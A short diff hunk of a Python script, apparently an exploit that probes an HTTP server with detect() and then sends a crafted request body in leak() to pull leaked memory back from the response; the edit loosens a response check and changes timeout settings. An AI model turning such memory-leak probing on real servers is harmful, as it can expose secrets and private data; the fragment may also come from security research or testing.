@@ -60,14 +60,14 @@ def detect():
                 print("    prefix=%-3s half=%d -> %s" % (len(pre), half, e))
                 continue
             print("    prefix=%-3s half=%d -> %d B %r" % (len(pre), half, len(out), out[:60]))
-            if out.startswith(b"HTTP/"):
+            if b"HTTP/" in out:
                 return True
     PREFIX, HALF = b"", True
     return False
 
 
 def leak():
-    s, out = xch(rbody("0", bytes([127 + 16]) + b"\x11\x22\x33"), timeout=6.0)
+    s, out = xch(rbody("0", bytes([127 + 16]) + b"\x11\x22\x33"), timeout=10.0, half=False)
     s.close()
     head, _, d = out.partition(b"\r\n\r\n")
     if len(d) < 0x100:
